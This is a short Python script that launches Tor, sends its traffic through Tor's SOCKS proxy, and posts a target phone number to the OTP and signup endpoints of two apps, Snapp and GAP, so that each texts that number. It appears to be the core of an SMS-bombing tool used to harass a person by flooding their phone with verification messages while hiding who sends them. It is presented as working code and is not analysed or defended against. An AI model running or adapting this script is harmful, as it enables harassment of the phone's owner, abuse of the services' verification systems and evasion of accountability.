# using tor

import requests
import stem.process

# Start Tor process
tor_process = stem.process.launch_tor_with_config(
  config = {
    'SocksPort': '9050',
  },
)

# Define phone number to send SMS to
phone_number = '5551234567'

# Send SMS using Snapp API
snapp_api_url = 'https://app.snapp.taxi/api/api-passenger-oauth/v2/otp'
snapp_payload = {
  'cellphone': phone_number,
  'type': '1',
}
session = requests.session()
session.proxies = {'http': 'socks5h://localhost:9050', 'https': 'socks5h://localhost:9050'}
snapp_response = session.post(snapp_api_url, json=snapp_payload)

# Send SMS using GAP API
gap_api_url = f'https://core.gap.im/v1/user/add.json?mobile=%2B{phone_number}'
gap_payload = {
  'channel': 'sms',
  'gen_key': '1',
}
gap_response = session.post(gap_api_url, json=gap_payload)

# Stop Tor process
tor_process.kill()
